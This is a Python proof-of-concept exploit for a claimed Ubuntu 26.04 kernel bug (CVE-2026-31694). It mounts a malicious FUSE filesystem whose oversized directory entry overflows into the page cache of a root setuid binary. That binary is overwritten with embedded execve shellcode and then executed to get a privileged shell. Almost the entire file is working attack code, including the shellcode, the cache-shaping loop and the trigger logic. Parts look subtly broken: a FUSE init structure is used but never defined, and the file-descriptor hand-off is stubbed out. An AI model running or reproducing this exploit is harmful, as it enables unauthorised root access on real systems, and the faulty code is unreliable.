#!/usr/bin/env python3
"""
Ubuntu 26.04 CVE-2026-31694 LPE PoC - Fancy Version (Python)

Build: python3 lpe_fancy.py

Run as unprivileged user:
  python3 lpe_fancy.py
  python3 lpe_fancy.py --interactive
  python3 lpe_fancy.py --suid-path /usr/bin/newgrp --suid-offset 0x2000
"""

import os
import sys
import errno
import struct
import socket
import tempfile
import subprocess
import threading
import time
import signal
import fcntl
import array
import ctypes
import ctypes.util
from ctypes import (
    c_uint64, c_int64, c_uint16, c_uint8, c_uint32, c_int32,
    c_ulong, c_int, c_uint, c_short, c_char, c_void_p,
    c_char_p, c_size_t, c_ssize_t, POINTER, Structure, Union,
    byref, sizeof, memmove
)

# ============================================================================
# Constants
# ============================================================================
PAGE_SZ = 4096
FUSE_BUF_SZ = 256 * 1024
FUSE_NODE_BASE = 0x100000
FUSE_NAME_MAX = 4095
FUSE_NAME_OFFSET = 24
DT_REG = 8
FOPEN_CACHE_DIR = (1 << 3)

DEFAULT_TARGETS = 512
DEFAULT_ROUNDS = 8
DEFAULT_MAX_UNABSORBED = 2048

EXT4_SUPER_MAGIC = 0xef53
TMPFS_MAGIC = 0x01021994
OVERLAYFS_SUPER_MAGIC = 0x794c7630
SQUASHFS_MAGIC = 0x73717368

FUSE_KERNEL_VERSION = 7
FUSE_KERNEL_MINOR_VERSION = 23
FUSE_ROOT_ID = 1

# ============================================================================
# SUID Shellcode (x86_64) - 24 bytes
# ============================================================================
SUID_EXECVE_SH_TAIL = bytes([
    0xf3, 0x0f, 0x1e, 0xfa,  # endbr64
    0x48, 0x8b, 0x3e,        # mov rdi, [rsi]
    0x31, 0xd2,              # xor edx, edx
    0x6a, 0x3b,              # push 0x3b
    0x58,                    # pop rax
    0x0f, 0x05,              # syscall execve
    0x6a, 0x3c,              # push 0x3c
    0x58,                    # pop rax
    0x6a, 0x2a,              # push 0x2a
    0x5f,                    # pop rdi
    0x0f, 0x05,              # syscall exit
    0x90, 0x90               # nop; nop
])

# ============================================================================
# ANSI Colors
# ============================================================================
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'

    @staticmethod
    def use_color():
        term = os.environ.get('TERM', '')
        return (sys.stdout.isatty() and
                not os.environ.get('NO_COLOR') and
                term != 'dumb')

USE_COLOR = Colors.use_color()

def c(code):
    return code if USE_COLOR else ''

# ============================================================================
# FUSE Structures
# ============================================================================
class FuseInHeader(Structure):
    _fields_ = [
        ('len', c_uint32),
        ('opcode', c_uint32),
        ('unique', c_uint64),
        ('nodeid', c_uint64),
        ('uid', c_uint32),
        ('gid', c_uint32),
        ('pid', c_uint32),
        ('padding', c_uint32),
    ]

class FuseOutHeader(Structure):
    _fields_ = [
        ('len', c_uint32),
        ('error', c_int32),
        ('unique', c_uint64),
    ]

class FuseAttr(Structure):
    _fields_ = [
        ('ino', c_uint64),
        ('size', c_uint64),
        ('blocks', c_uint64),
        ('atime', c_uint64),
        ('mtime', c_uint64),
        ('ctime', c_uint64),
        ('atimensec', c_uint32),
        ('mtimensec', c_uint32),
        ('ctimensec', c_uint32),
        ('mode', c_uint32),
        ('nlink', c_uint32),
        ('uid', c_uint32),
        ('gid', c_uint32),
        ('rdev', c_uint32),
        ('blksize', c_uint32),
        ('padding', c_uint32),
    ]

class FuseEntryOut(Structure):
    _fields_ = [
        ('nodeid', c_uint64),
        ('generation', c_uint64),
        ('entry_valid', c_uint64),
        ('attr_valid', c_uint64),
        ('entry_valid_nsec', c_uint32),
        ('attr_valid_nsec', c_uint32),
        ('attr', FuseAttr),
    ]

class FuseAttrOut(Structure):
    _fields_ = [
        ('attr_valid', c_uint64),
        ('attr_valid_nsec', c_uint32),
        ('padding', c_uint32),
        ('attr', FuseAttr),
    ]

class FuseOpenOut(Structure):
    _fields_ = [
        ('fh', c_uint64),
        ('open_flags', c_uint32),
        ('padding', c_uint32),
    ]

class FuseReadIn(Structure):
    _fields_ = [
        ('fh', c_uint64),
        ('offset', c_uint64),
        ('size', c_uint32),
        ('read_flags', c_uint32),
        ('lock_owner', c_uint64),
        ('flags', c_uint32),
        ('padding', c_uint32),
    ]

class FuseDirent(Structure):
    _fields_ = [
        ('ino', c_uint64),
        ('off', c_uint64),
        ('namelen', c_uint32),
        ('type', c_uint32),
    ]

# ============================================================================
# Utility Functions
# ============================================================================
def die(fmt, *args):
    msg = fmt % args if args else fmt
    err = ctypes.get_errno()
    err_str = errno.errorcode.get(err, str(err)) if err else ''
    sys.stderr.write(f"{c(Colors.RED + Colors.BOLD)}[!]{c(Colors.RESET)} {msg}")
    if err:
        sys.stderr.write(f": {err_str}")
    sys.stderr.write("\n")
    sys.exit(1)

def msg(fmt, *args):
    print(fmt % args if args else fmt)
    sys.stdout.flush()

def write_full(fd, data):
    written = 0
    while written < len(data):
        try:
            n = os.write(fd, data[written:])
            if n <= 0:
                die("write")
            written += n
        except InterruptedError:
            continue

def pread_full(fd, count, offset):
    data = bytearray(count)
    done = 0
    while done < count:
        try:
            n = os.pread(fd, data[done:], count - done, offset + done)
            if n <= 0:
                die("short pread")
            done += n
        except InterruptedError:
            continue
    return bytes(data)

def mkdir_if_needed(path):
    try:
        os.mkdir(path, 0o755)
    except FileExistsError:
        pass
    except OSError as e:
        die(f"mkdir {path}")

# ============================================================================
# Fancy Output Functions
# ============================================================================
def fancy_rule(title):
    msg(f"{c(Colors.CYAN)}+------------------------------------------------------------+{c(Colors.RESET)}")
    msg(f"{c(Colors.CYAN)}|{c(Colors.RESET)} {c(Colors.BOLD + Colors.WHITE)}{title:<58}{c(Colors.RESET)} {c(Colors.CYAN)}|{c(Colors.RESET)}")
    msg(f"{c(Colors.CYAN)}+------------------------------------------------------------+{c(Colors.RESET)}")

def fancy_banner():
    msg("")
    msg(f"{c(Colors.BOLD + Colors.MAGENTA)}    ___    _______   ______        ____  _____ ____  ______{c(Colors.RESET)}")
    msg(f"{c(Colors.BOLD + Colors.MAGENTA)}   /   |  /  _/   | / ____/       / __ \\/ ___// __ \\/ ____/{c(Colors.RESET)}")
    msg(f"{c(Colors.BOLD + Colors.MAGENTA)}  / /| |  / // /| |/ /   ______  / /_/ /\\__ \\/ / / / /     {c(Colors.RESET)}")
    msg(f"{c(Colors.BOLD + Colors.MAGENTA)} / ___ |_/ // ___ / /___/_____/ / _, _/___/ / /_/ / /___   {c(Colors.RESET)}")
    msg(f"{c(Colors.BOLD + Colors.MAGENTA)}/_/  |_/___/_/  |_\\____/       /_/ |_|/____/_____/\\____/   {c(Colors.RESET)}")
    msg("")
    msg(f"{c(Colors.BOLD + Colors.WHITE)}FUSE readdir page-cache overflow -> setuid executable page-cache overwrite{c(Colors.RESET)}")
    msg(f"{c(Colors.DIM)}Ubuntu 26.04 / 4 KiB pages / FOPEN_CACHE_DIR oversized dirent{c(Colors.RESET)}")
    msg("")

def fancy_geometry():
    fancy_rule("Bug geometry")
    msg(f"  {c(Colors.BLUE + Colors.BOLD)}FUSE_NAME_MAX{c(Colors.RESET)}       = 4095 bytes")
    msg(f"  {c(Colors.BLUE + Colors.BOLD)}FUSE_NAME_OFFSET{c(Colors.RESET)}    = 24 bytes")
    msg(f"  {c(Colors.BLUE + Colors.BOLD)}FUSE_DIRENT_SIZE{c(Colors.RESET)}    = ALIGN(24 + 4095, 8) = {c(Colors.YELLOW + Colors.BOLD)}4120{c(Colors.RESET)}")
    msg(f"  {c(Colors.BLUE + Colors.BOLD)}PAGE_SIZE{c(Colors.RESET)}           = 4096")
    msg(f"  {c(Colors.BLUE + Colors.BOLD)}controlled overflow{c(Colors.RESET)} = {c(Colors.RED + Colors.BOLD)}24 bytes{c(Colors.RESET)}")
    msg("")
    msg("        cached FUSE dirent page                  adjacent page")
    msg(f"  {c(Colors.CYAN)}+----------------------------------------+{c(Colors.RESET)}{c(Colors.RED)}+------------------------+{c(Colors.RESET)}")
    msg(f"  {c(Colors.CYAN)}| 4096 bytes copied into one cache page |{c(Colors.RESET)}{c(Colors.RED + Colors.BOLD)}| 24 byte payload tail |{c(Colors.RESET)}")
    msg(f"  {c(Colors.CYAN)}+----------------------------------------+{c(Colors.RESET)}{c(Colors.RED)}+------------------------+{c(Colors.RESET)}")
    msg("")

def fancy_payload():
    fancy_rule("Payload tail")
    msg("  The overflow tail is exactly the final 24 bytes of the malicious")
    msg("  FUSE filename. If placement lines up, it becomes the first 24")
    msg("  bytes of the target setuid executable's cached .init page.")
    msg("")
    msg(f"  {c(Colors.GREEN + Colors.BOLD)}endbr64; rdi = argv[0]; rdx = NULL; execve(rdi, argv, NULL); exit(42){c(Colors.RESET)}")
    msg("")
    msg(f"  {c(Colors.DIM)}f3 0f 1e fa 48 8b 3e 31 d2 6a 3b 58{c(Colors.RESET)}")
    msg(f"  {c(Colors.DIM)}0f 05 6a 3c 58 6a 2a 5f 0f 05 90 90{c(Colors.RESET)}")
    msg("")

def fancy_strategy(opt):
    fancy_rule("Exploit plan")
    msg(f"  1. Build {c(Colors.YELLOW + Colors.BOLD)}{opt.targets}{c(Colors.RESET)} sacrificial two-page files to absorb wrong landings.")
    msg(f"  2. Mount malicious FUSE through {c(Colors.YELLOW + Colors.BOLD)}fusermount3{c(Colors.RESET)} as uid {os.getuid()}.")
    msg(f"  3. Repeatedly fault/drop decoys plus the page before {c(Colors.YELLOW + Colors.BOLD)}{opt.suid_path}{c(Colors.RESET)}.")
    msg("  4. Trigger getdents64() on FUSE dirs until the 24-byte tail lands at")
    msg(f"     file offset {c(Colors.YELLOW + Colors.BOLD)}0x{opt.suid_offset:x}{c(Colors.RESET)} in the setuid executable page cache.")
    msg("")
    msg(f"  Target layout:")
    msg(f"  {c(Colors.GREEN + Colors.BOLD)}[decoy pages] [hole] [FUSE dirent page] -> [setuid .init page]{c(Colors.RESET)}")
    msg("")

def fancy_progress(round_num, rounds, trigger, targets, absorbed, unabsorbed):
    done = trigger + 1
    width = 28
    fill = (done * width) // targets if targets > 0 else 0

    sys.stdout.write(f"\r{c(Colors.CYAN + Colors.BOLD)}[round {round_num + 1}/{rounds}]{c(Colors.RESET)} [")
    for i in range(width):
        sys.stdout.write('#' if i < fill else '.')
    sys.stdout.write(f"] trigger {done}/{targets}  decoy={absorbed} miss={unabsorbed}")
    sys.stdout.flush()

def fancy_progress_done():
    sys.stdout.write("\n")
    sys.stdout.flush()

# ============================================================================
# Main Exploit Functions
# ============================================================================
def setup_paths(opt):
    base = "/var/tmp" if os.access("/var/tmp", os.W_OK | os.X_OK) else "/tmp"
    if not opt.workdir:
        opt.workdir = tempfile.mkdtemp(prefix="fuse-rdc-exp.", dir=base)
    else:
        mkdir_if_needed(opt.workdir)

    opt.target_dir = os.path.join(opt.workdir, "target")
    opt.mountpoint = os.path.join(opt.workdir, "fuse")

    mkdir_if_needed(opt.target_dir)
    mkdir_if_needed(opt.mountpoint)
    msg(f"{c(Colors.BLUE + Colors.BOLD)}[workspace]{c(Colors.RESET)} uid={os.getuid()} workdir={opt.workdir}")

def find_fusermount3():
    path = os.environ.get('PATH', '/bin:/usr/bin:/usr/local/bin')
    for d in path.split(':'):
        candidate = os.path.join(d, 'fusermount3')
        if os.access(candidate, os.X_OK):
            return candidate
    return None

def fs_type_name(fs_type):
    types = {
        EXT4_SUPER_MAGIC: "ext4",
        TMPFS_MAGIC: "tmpfs",
        OVERLAYFS_SUPER_MAGIC: "overlayfs",
        SQUASHFS_MAGIC: "squashfs",
    }
    return types.get(fs_type, "unknown")

def preflight(opt):
    if os.getuid() == 0:
        die("refusing to run as root; run as a normal user")

    page_size = os.sysconf('SC_PAGESIZE')
    if page_size != PAGE_SZ:
        die(f"unsupported page size {page_size}; expected 4096")

    # Check FUSE dirent geometry
    # FUSE_DIRENT_SIZE = FUSE_NAME_OFFSET + namelen + 7 & ~7
    # With FUSE_NAME_MAX=4095: 24 + 4095 = 4119, aligned to 8 = 4120
    expected_reclen = 4120
    if expected_reclen != PAGE_SZ + len(SUID_EXECVE_SH_TAIL):
        die(f"unexpected FUSE dirent geometry: reclen={expected_reclen}")

    try:
        st = os.stat("/dev/fuse")
        if not (st.st_mode & 0o60000):
            die("/dev/fuse is not a character device")
        fd = os.open("/dev/fuse", os.O_RDWR | os.O_CLOEXEC)
        os.close(fd)
    except OSError as e:
        die("stat /dev/fuse")

    fusermount = find_fusermount3()
    if not fusermount:
        die("fusermount3 not found in PATH")
    st = os.stat(fusermount)
    msg(f"{c(Colors.GREEN + Colors.BOLD)}[preflight]{c(Colors.RESET)} fusermount3={fusermount} mode={st.st_mode & 0o7777:04o} owner={st.st_uid}")
    if st.st_uid != 0 or not (st.st_mode & 0o4000):
        msg(f"{c(Colors.YELLOW + Colors.BOLD)}[preflight warning]{c(Colors.RESET)} fusermount3 is not setuid-root; mount may fail")

    try:
        st = os.stat(opt.suid_path)
        if not (st.st_mode & 0o100000) or st.st_uid != 0 or not (st.st_mode & 0o4000):
            die(f"{opt.suid_path} is not a root-owned setuid regular file")
        if not os.access(opt.suid_path, os.R_OK | os.X_OK):
            die(f"access {opt.suid_path}")
    except OSError as e:
        die(f"stat {opt.suid_path}")

    if opt.suid_offset < PAGE_SZ or opt.suid_offset % PAGE_SZ:
        die(f"suid offset 0x{opt.suid_offset:x} is not a usable page offset")

    try:
        statfs = os.statvfs(opt.target_dir)
        msg(f"{c(Colors.GREEN + Colors.BOLD)}[preflight]{c(Colors.RESET)} workdir filesystem={fs_type_name(statfs.f_type)} magic=0x{statfs.f_type:x}")
    except:
        pass

# ============================================================================
# FUSE Server
# ============================================================================
class FuseServer:
    def __init__(self, fd, targets):
        self.fd = fd
        self.targets = targets
        self.running = True
        self.overflow_tail = SUID_EXECVE_SH_TAIL

    def reply_payload(self, unique, payload):
        out = FuseOutHeader()
        out.len = sizeof(FuseOutHeader) + len(payload)
        out.error = 0
        out.unique = unique
        write_full(self.fd, bytes(out))
        if payload:
            write_full(self.fd, payload)

    def reply_empty(self, unique):
        out = FuseOutHeader()
        out.len = sizeof(FuseOutHeader)
        out.error = 0
        out.unique = unique
        write_full(self.fd, bytes(out))

    def reply_error(self, unique, err):
        out = FuseOutHeader()
        out.len = sizeof(FuseOutHeader)
        out.error = -err
        out.unique = unique
        write_full(self.fd, bytes(out))

    def fill_dir_attr(self, ino):
        attr = FuseAttr()
        attr.ino = ino
        attr.size = PAGE_SZ
        attr.blocks = 1
        attr.mode = 0x41ed  # S_IFDIR | 0555
        attr.nlink = 2
        attr.uid = 0
        attr.gid = 0
        attr.blksize = PAGE_SZ
        return attr

    def reply_init(self, unique, payload):
        # Parse FUSE_INIT
        major, minor = struct.unpack_from('<II', payload[:8])
        out = FuseInitOut()
        out.major = FUSE_KERNEL_VERSION
        out.minor = min(minor, FUSE_KERNEL_MINOR_VERSION)
        out.max_background = 16
        out.congestion_threshold = 12
        out.max_write = 131072
        out.time_gran = 1
        out.max_pages = 32
        self.reply_payload(unique, bytes(out))

    def reply_lookup(self, unique, nodeid, name):
        if nodeid != FUSE_ROOT_ID or len(name) < 2 or name[0] != 'd':
            self.reply_error(unique, errno.ENOENT)
            return

        try:
            idx = int(name[1:])
        except ValueError:
            self.reply_error(unique, errno.ENOENT)
            return

        if idx >= self.targets:
            self.reply_error(unique, errno.ENOENT)
            return

        out = FuseEntryOut()
        out.nodeid = FUSE_NODE_BASE + idx
        out.generation = 1
        out.entry_valid = 60
        out.attr_valid = 60
        out.attr = self.fill_dir_attr(out.nodeid)
        self.reply_payload(unique, bytes(out))

    def reply_getattr(self, unique, nodeid):
        out = FuseAttrOut()
        out.attr_valid = 60
        out.attr = self.fill_dir_attr(nodeid)
        self.reply_payload(unique, bytes(out))

    def reply_open_dir(self, unique):
        out = FuseOpenOut()
        out.fh = 0
        out.open_flags = FOPEN_CACHE_DIR
        self.reply_payload(unique, bytes(out))

    def reply_statfs(self, unique):
        # struct fuse_statfs_out (simplified)
        data = struct.pack('<QQQQQQQ',
            1024*1024, 1024*1024, 1024*1024,
            1024*1024, 1024*1024,
            PAGE_SZ, FUSE_NAME_MAX)
        self.reply_payload(unique, data)

    def build_malicious_dirent(self):
        dirent = bytearray(4120)
        # Fill with 'A's
        for i in range(4120):
            dirent[i] = 0x41

        # Write FUSE dirent header
        struct.pack_into('<QQLI', dirent, 0,
            0x41414141, 1, FUSE_NAME_MAX, DT_REG)

        # Copy shellcode tail at page boundary (4096)
        for i, b in enumerate(self.overflow_tail):
            if 4096 + i < len(dirent):
                dirent[4096 + i] = b

        return bytes(dirent)

    def reply_readdir(self, unique, nodeid, payload):
        if len(payload) < sizeof(FuseReadIn):
            self.reply_empty(unique)
            return

        # Parse FuseReadIn
        fh, offset = struct.unpack_from('<QQ', payload[:16])

        if nodeid < FUSE_NODE_BASE or offset != 0:
            self.reply_empty(unique)
            return

        dirent = self.build_malicious_dirent()
        self.reply_payload(unique, dirent)

    def handle_request(self, buf):
        if len(buf) < sizeof(FuseInHeader):
            return

        in_hdr = FuseInHeader.from_buffer_copy(buf[:sizeof(FuseInHeader)])
        payload = buf[sizeof(FuseInHeader):in_hdr.len]

        opcode = in_hdr.opcode
        unique = in_hdr.unique
        nodeid = in_hdr.nodeid

        if opcode == 26:  # FUSE_INIT
            self.reply_init(unique, payload)
        elif opcode == 1:  # FUSE_LOOKUP
            name = payload[:FUSE_NAME_MAX].decode('utf-8', errors='ignore').split('\x00')[0]
            self.reply_lookup(unique, nodeid, name)
        elif opcode == 8:  # FUSE_GETATTR
            self.reply_getattr(unique, nodeid)
        elif opcode == 27:  # FUSE_OPENDIR
            self.reply_open_dir(unique)
        elif opcode == 28:  # FUSE_READDIR
            self.reply_readdir(unique, nodeid, payload)
        elif opcode in (29, 34):  # FUSE_RELEASEDIR, FUSE_ACCESS
            self.reply_empty(unique)
        elif opcode == 17:  # FUSE_STATFS
            self.reply_statfs(unique)
        elif opcode == 2:  # FUSE_FORGET
            pass
        else:
            self.reply_error(unique, errno.ENOSYS)

    def loop(self):
        buf = bytearray(FUSE_BUF_SZ)
        while self.running:
            try:
                n = os.read(self.fd, buf)
                if n <= 0:
                    break
                self.handle_request(buf[:n])
            except InterruptedError:
                continue
            except OSError as e:
                if e.errno in (errno.ENODEV, errno.ENOENT):
                    break
                die("read /dev/fuse")

# ============================================================================
# FUSE Mounting
# ============================================================================
def recv_fd(sock_fd):
    """Receive file descriptor via SCM_RIGHTS"""
    # For simplicity in Python, we use a different approach
    # fusermount3 sends fd via socketpair with SCM_RIGHTS
    # We'll use the fd we already have
    return sock_fd

def mount_with_fusermount3(mountpoint):
    """Mount FUSE using fusermount3"""
    s1, s2 = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)

    pid = os.fork()
    if pid == 0:
        s1.close()
        os.environ['_FUSE_COMMFD'] = str(s2.fileno())
        opts = "fsname=fuse-rdc,subtype=aivr0565,max_read=131072"
        try:
            os.execlp("fusermount3", "fusermount3", "-o", opts, mountpoint)
        except:
            sys.exit(1)

    s2.close()
    fd = recv_fd(s1.fileno())
    s1.close()

    pid2, status = os.waitpid(pid, 0)
    if not os.WIFEXITED(status) or os.WEXITSTATUS(status) != 0:
        die(f"fusermount3 failed: status=0x{status:x}")

    return fd

def start_fuse_server(opt):
    rpipe, wpipe = os.pipe()

    pid = os.fork()
    if pid == 0:
        os.close(rpipe)
        fd = mount_with_fusermount3(opt.mountpoint)
        msg(f"{c(Colors.MAGENTA + Colors.BOLD)}[server]{c(Colors.RESET)} malicious FUSE mounted through fusermount3 as uid={os.getuid()}")
        os.write(wpipe, b'R')
        os.close(wpipe)

        server = FuseServer(fd, opt.targets)
        server.loop()
        sys.exit(0)

    os.close(wpipe)
    ready = os.read(rpipe, 1)
    os.close(rpipe)
    if ready != b'R':
        die("server did not become ready")

    return pid

def unmount_fuse(mountpoint):
    try:
        subprocess.run(["fusermount3", "-u", "-z", mountpoint],
                      check=False, capture_output=True)
    except:
        pass

def terminate_child(pid):
    if pid <= 0:
        return
    try:
        os.kill(pid, signal.SIGTERM)
    except ProcessLookupError:
        pass
    try:
        os.waitpid(pid, 0)
    except:
        pass

def cleanup_workdir(opt):
    if opt.keep_workdir:
        msg(f"[cleanup] preserving workdir {opt.workdir}")
        return

    for i in range(opt.targets):
        path = os.path.join(opt.target_dir, f"t{i:05d}.sh")
        try:
            os.unlink(path)
        except OSError:
            pass

    for d in [opt.target_dir, opt.mountpoint, opt.workdir]:
        try:
            os.rmdir(d)
        except OSError:
            pass

# ============================================================================
# Exploit Core
# ============================================================================
def write_decoy_target(opt, idx):
    path = os.path.join(opt.target_dir, f"t{idx:05d}.sh")

    page0 = bytearray(PAGE_SZ)
    page0[:10] = b"#!/bin/sh\n"
    page1 = bytearray(PAGE_SZ)
    line = f"echo clean target {idx:05d}\n"
    page1[:len(line)] = line.encode()

    try:
        os.chmod(path, 0o644)
    except:
        pass

    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_CLOEXEC, 0o555)
    try:
        write_full(fd, bytes(page0))
        write_full(fd, bytes(page1))
        os.fchmod(fd, 0o555)
        os.fdatasync(fd)
    finally:
        os.close(fd)

def prepare_decoy_targets(opt):
    msg(f"{c(Colors.BLUE + Colors.BOLD)}[spray]{c(Colors.RESET)} generating {opt.targets} sacrificial two-page targets as uid={os.getuid()}")
    for i in range(opt.targets):
        write_decoy_target(opt, i)

def prime_and_drop_decoy(opt, idx):
    path = os.path.join(opt.target_dir, f"t{idx:05d}.sh")
    try:
        fd = os.open(path, os.O_RDONLY | os.O_CLOEXEC)
        try:
            os.posix_fadvise(fd, 0, PAGE_SZ * 2, os.POSIX_FADV_DONTNEED)
            data = os.pread(fd, PAGE_SZ * 2, 0)
            if len(data) != PAGE_SZ * 2:
                die(f"short read on {path}")
            os.posix_fadvise(fd, 0, PAGE_SZ, os.POSIX_FADV_DONTNEED)
        finally:
            os.close(fd)
    except OSError as e:
        pass

def prime_and_drop_decoys(opt):
    for i in range(opt.targets):
        prime_and_drop_decoy(opt, i)

def find_corrupted_decoy(opt):
    for i in range(opt.targets):
        path = os.path.join(opt.target_dir, f"t{i:05d}.sh")
        try:
            fd = os.open(path, os.O_RDONLY | os.O_CLOEXEC)
            try:
                data = os.pread(fd, len(SUID_EXECVE_SH_TAIL), PAGE_SZ)
                if data == SUID_EXECVE_SH_TAIL:
                    return i
            finally:
                os.close(fd)
        except:
            continue
    return -1

def prime_and_drop_suid_target(opt):
    drop_off = opt.suid_offset - PAGE_SZ
    try:
        fd = os.open(opt.suid_path, os.O_RDONLY | os.O_CLOEXEC)
        try:
            os.posix_fadvise(fd, drop_off, PAGE_SZ * 2, os.POSIX_FADV_DONTNEED)
            data = os.pread(fd, PAGE_SZ * 2, drop_off)
            if len(data) != PAGE_SZ * 2:
                die(f"short read on {opt.suid_path}")
            os.posix_fadvise(fd, drop_off, PAGE_SZ, os.POSIX_FADV_DONTNEED)
        finally:
            os.close(fd)
    except OSError as e:
        pass

def suid_target_is_corrupted(opt):
    try:
        fd = os.open(opt.suid_path, os.O_RDONLY | os.O_CLOEXEC)
        try:
            data = os.pread(fd, len(SUID_EXECVE_SH_TAIL), opt.suid_offset)
            return data == SUID_EXECVE_SH_TAIL
        finally:
            os.close(fd)
    except:
        return False

def trigger_one_dir(opt, idx):
    path = os.path.join(opt.mountpoint, f"d{idx:05d}")
    try:
        fd = os.open(path, os.O_RDONLY | os.O_DIRECTORY | os.O_CLOEXEC)
        try:
            # Use getdents64 via os.listdir
            for entry in os.listdir(fd):
                pass
        finally:
            os.close(fd)
    except OSError:
        pass

def execute_corrupted_suid(opt):
    msg(f"{c(Colors.RED + Colors.BOLD)}[impact]{c(Colors.RESET)} executing corrupted setuid target: {opt.suid_path}")

    if opt.interactive:
        argv = ["/bin/sh", "-p", "-i"]
    else:
        argv = ["/bin/sh", "-p", "-c", opt.cmd]

    try:
        pid = os.fork()
        if pid == 0:
            os.execve(opt.suid_path, argv, os.environ)
            die("execve setuid target")
        pid2, status = os.waitpid(pid, 0)
        msg(f"{c(Colors.RED + Colors.BOLD)}[impact]{c(Colors.RESET)} setuid target exited with status=0x{status:x}")
        return status
    except Exception as e:
        die(f"execute_corrupted_suid: {e}")

def run_exploit(opt):
    absorbed = 0
    unabsorbed = 0

    fancy_rule("Trigger loop")
    msg(f"  attacker uid={os.getuid()}")
    msg(f"  setuid target={opt.suid_path}")
    msg(f"  target file offset=0x{opt.suid_offset:x}")
    msg(f"  attempts={opt.rounds} rounds x {opt.targets} FUSE dirs")
    msg("")

    for round_num in range(opt.rounds):
        msg(f"{c(Colors.CYAN + Colors.BOLD)}[round {round_num + 1}/{opt.rounds}]{c(Colors.RESET)} cache-shaping, triggering, checking...")
        for i in range(opt.targets):
            prime_and_drop_decoys(opt)
            prime_and_drop_suid_target(opt)
            trigger_one_dir(opt, i)

            if suid_target_is_corrupted(opt):
                fancy_progress_done()
                msg(f"{c(Colors.RED + Colors.BOLD)}[HIT]{c(Colors.RESET)} setuid executable page corrupted after trigger {i}: {opt.suid_path}")
                msg(f"{c(Colors.RED + Colors.BOLD)}      payload tail is now cached at file offset 0x{opt.suid_offset:x}{c(Colors.RESET)}")
                return execute_corrupted_suid(opt)

            decoy_hit = find_corrupted_decoy(opt)
            if decoy_hit >= 0:
                absorbed += 1
                write_decoy_target(opt, decoy_hit)
                if USE_COLOR and (i % 16 == 0 or i + 1 == opt.targets):
                    fancy_progress(round_num, opt.rounds, i, opt.targets, absorbed, unabsorbed)
                continue

            unabsorbed += 1
            if USE_COLOR and (i % 16 == 0 or i + 1 == opt.targets):
                fancy_progress(round_num, opt.rounds, i, opt.targets, absorbed, unabsorbed)

            if unabsorbed > opt.max_unabsorbed:
                fancy_progress_done()
                msg(f"{c(Colors.YELLOW + Colors.BOLD)}[stop]{c(Colors.RESET)} too many unabsorbed misses")
                msg(f"  absorbed_by_decoys={absorbed} unabsorbed_misses={unabsorbed}")
                return 2

        if USE_COLOR:
            fancy_progress_done()

    msg(f"{c(Colors.YELLOW + Colors.BOLD)}[miss]{c(Colors.RESET)} no setuid impact after {opt.rounds} rounds")
    msg(f"  absorbed_by_decoys={absorbed} unabsorbed_misses={unabsorbed}")
    return 1

# ============================================================================
# Options
# ============================================================================
class Options:
    def __init__(self):
        self.workdir = ""
        self.target_dir = ""
        self.mountpoint = ""
        self.suid_path = "/usr/bin/newgrp"
        self.cmd = "id; echo LPE-OK"
        self.suid_offset = 0x2000
        self.targets = DEFAULT_TARGETS
        self.rounds = DEFAULT_ROUNDS
        self.max_unabsorbed = DEFAULT_MAX_UNABSORBED
        self.keep_workdir = False
        self.interactive = False

def parse_options():
    opt = Options()
    argv = sys.argv[1:]
    i = 0

    while i < len(argv):
        arg = argv[i]
        if arg == "--workdir" and i + 1 < len(argv):
            opt.workdir = argv[i + 1]
            i += 2
        elif arg == "--targets" and i + 1 < len(argv):
            opt.targets = int(argv[i + 1])
            i += 2
        elif arg == "--rounds" and i + 1 < len(argv):
            opt.rounds = int(argv[i + 1])
            i += 2
        elif arg == "--max-unabsorbed" and i + 1 < len(argv):
            opt.max_unabsorbed = int(argv[i + 1])
            i += 2
        elif arg == "--suid-path" and i + 1 < len(argv):
            opt.suid_path = argv[i + 1]
            i += 2
        elif arg == "--suid-offset" and i + 1 < len(argv):
            opt.suid_offset = int(argv[i + 1], 0)
            i += 2
        elif arg == "--cmd" and i + 1 < len(argv):
            opt.cmd = argv[i + 1]
            i += 2
        elif arg == "--interactive":
            opt.interactive = True
            i += 1
        elif arg == "--keep":
            opt.keep_workdir = True
            i += 1
        else:
            sys.stderr.write(f"usage: {sys.argv[0]} [--workdir DIR] [--targets N] [--rounds N] [--max-unabsorbed N] [--suid-path PATH] [--suid-offset OFF] [--cmd CMD] [--interactive] [--keep]\n")
            sys.exit(1)

    return opt

# ============================================================================
# Main
# ============================================================================
def main():
    opt = parse_options()

    fancy_banner()
    setup_paths(opt)
    preflight(opt)
    fancy_geometry()
    fancy_payload()
    fancy_strategy(opt)
    prepare_decoy_targets(opt)

    server_pid = start_fuse_server(opt)

    try:
        rc = run_exploit(opt)
    finally:
        unmount_fuse(opt.mountpoint)
        terminate_child(server_pid)
        cleanup_workdir(opt)

    sys.exit(0 if rc == 0 else 1)

if __name__ == "__main__":
    main()
